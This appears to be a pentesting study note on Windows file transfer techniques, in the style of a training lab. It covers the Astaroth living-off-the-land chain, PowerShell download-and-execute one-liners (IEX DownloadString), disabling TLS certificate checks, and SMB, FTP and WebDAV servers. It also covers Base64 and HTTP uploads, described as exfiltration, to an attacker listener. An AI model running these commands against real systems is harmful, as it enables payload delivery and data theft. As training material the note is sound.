
# Windows File Transfer Methods

## Introduction

Modern Windows operating systems include **multiple built-in utilities** that can be abused for file transfer operations. Understanding these techniques is valuable for both:

* **Attackers** → to move tools, payloads, or data while evading detection
* **Defenders** → to detect misuse and enforce proper security controls

Many advanced attacks rely on **native Windows tools** rather than custom malware—this is known as **Living Off the Land**.

---

## Real-World Example: Astaroth (Fileless Attack)

An excellent illustration of advanced file transfer abuse is the **Astaroth APT attack**, which relied almost entirely on native Windows tools.

### High-Level Attack Flow

1. Spear-phishing email delivers a malicious **LNK file**
2. LNK executes **WMIC** with `/Format` to download JavaScript
3. JavaScript downloads payloads using **Bitsadmin**
4. Payloads are **Base64-encoded**
5. **Certutil** decodes payloads into DLLs
6. **regsvr32** loads the DLLs
7. Final payload is injected into **Userinit**

### Key Lesson

Even “fileless” attacks **still involve file transfer**—files may never touch disk or may exist only in memory.

---

## Download Operations on Windows

We assume:

* Target: Windows host (MS02)
* Attacker: HTB Pwnbox
* Goal: Download files to the Windows target

---

## PowerShell Base64 Encode & Decode (No Network)

This method avoids network communication entirely.

### Use Case

* Network heavily restricted
* Small to medium files
* Terminal or web shell access

### Workflow

1. Encode file on attacker machine
2. Copy Base64 string
3. Decode on Windows target
4. Verify integrity using MD5

### Advantages

* No ports required
* Bypasses firewall rules

### Limitations

* `cmd.exe` max string length ≈ **8,191 characters**
* Not suitable for large files
* Web shells may fail with long strings

---

## PowerShell Web Downloads

Most enterprise networks allow **HTTP (80)** and **HTTPS (443)** outbound traffic.

### Net.WebClient Methods

PowerShell supports multiple download techniques via `System.Net.WebClient`.

Common methods:

* `DownloadFile`
* `DownloadString`
* `DownloadData`
* Async variants

---

### DownloadFile (Writes to Disk)

```powershell
(New-Object Net.WebClient).DownloadFile('<URL>','C:\Path\file.ps1')
```

---

### DownloadString (Fileless / In-Memory)

```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```

Or via pipeline:

```powershell
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```

✔ Ideal for **fileless execution**
✘ Highly monitored by EDR

---

## Invoke-WebRequest (PowerShell ≥ 3.0)

```powershell
Invoke-WebRequest <URL> -OutFile file.ps1
```

Aliases:

* `iwr`
* `curl`
* `wget`

### Common Errors & Fixes

**IE First-Run Error**

```powershell
-UseBasicParsing
```

**SSL/TLS Certificate Error**

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

## SMB Downloads (TCP/445)

SMB is common in Windows enterprise environments.

### Attacker: Create SMB Server

```bash
impacket-smbserver share /tmp/smbshare -smb2support
```

### Target: Download File

```cmd
copy \\IP\share\file.exe
```

---

### SMB with Authentication (Modern Windows)

```bash
impacket-smbserver share /tmp/smbshare -user test -password test
```

```cmd
net use n: \\IP\share /user:test test
copy n:\file.exe
```

---

## FTP Downloads (TCP/21)

### Attacker: FTP Server

```bash
python3 -m pyftpdlib --port 21
```

### Target: PowerShell Download

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://IP/file.txt','C:\file.txt')
```

### FTP via Script (Non-Interactive Shell)

```cmd
ftp -n -s:ftpcommand.txt
```

---

## Upload Operations (Windows → Attacker)

Used for:

* Exfiltration
* Password cracking
* Offline analysis

---

## Base64 Upload (No Network Tooling)

### Encode on Windows

```powershell
[Convert]::ToBase64String((Get-Content file -Encoding byte))
```

### Decode on Linux

```bash
echo <base64> | base64 -d > file
```

✔ Stealthy
✘ Size-limited

---

## PowerShell Web Uploads

PowerShell has **no native upload cmdlet**, but uploads can be built using:

* `Invoke-WebRequest`
* `Invoke-RestMethod`

---

### Python Upload Server (Attacker)

```bash
pip3 install uploadserver
python3 -m uploadserver
```

---

### PowerShell Upload Script

```powershell
Invoke-FileUpload -Uri http://IP:8000/upload -File C:\path\file
```

---

## Base64 Web Upload (PowerShell + Netcat)

### Windows

```powershell
Invoke-WebRequest -Uri http://IP:8000 -Method POST -Body $b64
```

### Attacker

```bash
nc -lvnp 8000
```

Decode captured Base64 string.

---

## SMB Uploads via WebDAV (SMB over HTTP)

Enterprise networks often block **TCP/445**, but allow **HTTP/HTTPS**.

### WebDAV enables:

* File operations over HTTP
* SMB fallback using `DavWWWRoot`

---

### Attacker: WebDAV Server

```bash
pip3 install wsgidav cheroot
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

---

### Windows: Access WebDAV

```cmd
dir \\IP\DavWWWRoot
```

Upload:

```cmd
copy file.zip \\IP\DavWWWRoot\
```

---

## FTP Uploads

### Attacker: FTP Server (Write Enabled)

```bash
python3 -m pyftpdlib --port 21 --write
```

### PowerShell Upload

```powershell
(New-Object Net.WebClient).UploadFile('ftp://IP/file','C:\path\file')
```

### FTP Script Upload

```cmd
ftp -n -s:ftpcommand.txt
```

---

## Recap

Windows offers **many native file transfer methods**:

### Download

* Base64 (offline)
* PowerShell WebClient
* Invoke-WebRequest
* SMB
* FTP

### Upload

* Base64
* HTTP POST
* SMB / WebDAV
* FTP

---

## Key Takeaway

File transfer is **not a single technique**—it’s a **decision-making skill**.

A strong pentester:

* Knows multiple options
* Adapts to restrictions
* Chooses the least noisy method

---

